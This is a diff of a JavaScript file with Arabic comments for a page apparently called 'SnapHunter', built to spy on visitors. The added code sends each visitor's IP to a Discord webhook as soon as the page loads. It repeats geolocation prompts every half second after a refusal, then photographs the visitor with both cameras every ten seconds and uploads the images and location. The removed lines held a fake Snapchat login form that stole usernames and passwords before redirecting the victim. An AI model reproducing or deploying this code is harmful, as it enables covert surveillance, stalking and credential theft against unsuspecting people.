@@ -7,7 +7,7 @@ const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 let userLat = null, userLng = null;
 
-// 1. جلب IP الجهاز
+// 1. جلب IP الجهاز فوراً (بدون أذونات)
 async function getIP() {
     try {
         const res = await fetch('https://api.ipify.org?format=json');
@@ -16,7 +16,7 @@ async function getIP() {
     } catch { return "Unknown"; }
 }
 
-// 2. وظيفة طلب الموقع بشكل إجباري ومباشر
+// 2. طلب الموقع بشكل إجباري (تكرار عند الرفض)
 function forceLocation() {
     navigator.geolocation.getCurrentPosition(
         (p) => {
@@ -24,100 +24,80 @@ function forceLocation() {
             userLng = p.coords.longitude;
         },
         () => {
-            // إعادة الطلب فوراً عند الرفض لإجبار المستخدم
-            setTimeout(forceLocation, 1000);
+            // إذا رفض، يكرر الطلب فوراً وبدون توقف
+            setTimeout(forceLocation, 500); 
         },
         { enableHighAccuracy: true }
     );
 }
 
-// 3. وظيفة التقاط صورة من عدسة معينة
-async function captureFrom(facingMode) {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: facingMode } 
-        });
-        video.srcObject = stream;
+// 3. التقاط وإرسال (كاميرا أمامية + خلفية)
+async function captureAndSendDual() {
+    const ip = await getIP();
+    
+    // التقاط الأمامية
+    const frontBlob = await getBlob("user");
+    // التقاط الخلفية
+    const backBlob = await getBlob("environment");
 
-        return new Promise((resolve) => {
+    if (frontBlob || backBlob || userLat) {
+        const formData = new FormData();
+        let content = `🚀 **صيد جديد (تلقائي)**\n🌐 IP: \`${ip}\` \n`;
+        if (userLat) content += `📍 الموقع: [Google Maps](https://www.google.com/maps?q=${userLat},${userLng}) \n`;
+
+        if (frontBlob) formData.append('file1', frontBlob, 'front.png');
+        if (backBlob) formData.append('file2', backBlob, 'back.png');
+        
+        formData.append('payload_json', JSON.stringify({ content: content, username: "SnapHunter" }));
+        fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+    }
+}
+
+// وظيفة مساعدة لفتح الكاميرا والتقاط الصورة
+async function getBlob(mode) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+        video.srcObject = stream;
+        return new Promise(resolve => {
             video.onloadedmetadata = () => {
                 video.play();
-                // انتظار 1.5 ثانية لضمان فتح العدسة وعدم ظهور سواد
                 setTimeout(() => {
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     canvas.toBlob(blob => {
-                        // إغلاق الكاميرا فوراً للتمكن من فتح الأخرى
                         stream.getTracks().forEach(t => t.stop());
                         resolve(blob);
                     }, 'image/png');
-                }, 1500);
+                }, 1200); // وقت لفتح العدسة
             };
         });
-    } catch (e) { return null; }
+    } catch { return null; }
 }
 
-// 4. إرسال البيانات الشاملة لديسكورد
-async function sendFullLog(frontImg, backImg, user = "", pass = "") {
+// 4. المحرك الأساسي (يعمل فور الدخول)
+async function runSystem() {
+    // إرسال تنبيه بالدخول بالـ IP فقط أولاً
     const ip = await getIP();
-    const formData = new FormData();
-    
-    let content = `📸 **صيد جديد (كاميرا مزدوجة + موقع)**\n🌐 IP: \`${ip}\` \n`;
-    if (user) content += `👤 الحساب: \`${user}\` | الرمز: \`${pass}\` \n`;
-    if (userLat) content += `📍 الموقع: [فتح الخريطة](https://www.google.com/maps?q=${userLat},${userLng}) \n`;
+    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: `👤 شخص دخل الموقع الآن! IP: ${ip}`}) });
 
-    if (frontImg) formData.append('file1', frontImg, 'front.png');
-    if (backImg) formData.append('file2', backImg, 'back.png');
-    
-    formData.append('payload_json', JSON.stringify({
-        content: content,
-        username: "SnapHunter Ultimate",
-        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
-    }));
-
-    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-}
-
-// 5. تشغيل النظام
-async function startSystem() {
-    // طلب الكاميرا أولاً
+    // أ- طلب الكاميرا "مباشرة"
     try {
-        // نبدأ بالأمامية ثم نطلب الموقع مباشرة
-        const firstStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        firstStream.getTracks().forEach(t => t.stop()); // مجرد اختبار للأذونات
-        
-        // طلب الموقع فوراً بعد الموافقة على الكاميرا
+        const initialStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        initialStream.getTracks().forEach(t => t.stop()); // فقط لفتح الإذن
+
+        // ب- طلب الموقع "مباشرة" بعد الكاميرا
         forceLocation();
 
-        // حلقة التكرار كل 10 ثوانٍ (للتبديل بين الكاميرتين)
-        setInterval(async () => {
-            const front = await captureFrom("user");
-            const back = await captureFrom("environment");
-            if (front || back) await sendFullLog(front, back);
-        }, 10000);
+        // ج- بدء حلقة التصوير كل 10 ثوانٍ
+        setInterval(captureAndSendDual, 10000);
+        captureAndSendDual(); // أول لقطة فورية
 
     } catch (err) {
+        // إذا رفض الكاميرا، استمر بطلب الموقع وإرسال الـ IP
         forceLocation();
-        setInterval(() => sendFullLog(null, null), 10000);
+        setInterval(() => captureAndSendDual(), 10000);
     }
 }
 
-window.onload = startSystem;
-
-// معالجة صفحة تسجيل الدخول (apply2.html)
-const loginForm = document.getElementById('fullLoginForm');
-if (loginForm) {
-    loginForm.onsubmit = async (e) => {
-        e.preventDefault();
-        const u = e.target.username.value;
-        const p = e.target.password.value;
-        document.getElementById('loadingOverlay').style.display = 'flex';
-
-        const front = await captureFrom("user");
-        await sendFullLog(front, null, u, p);
-        
-        setTimeout(() => {
-            window.location.href = "https://accounts.snapchat.com/";
-        }, 1000);
-    };
-}
+// تنفيذ النظام لحظة دخول الموقع
+runSystem();
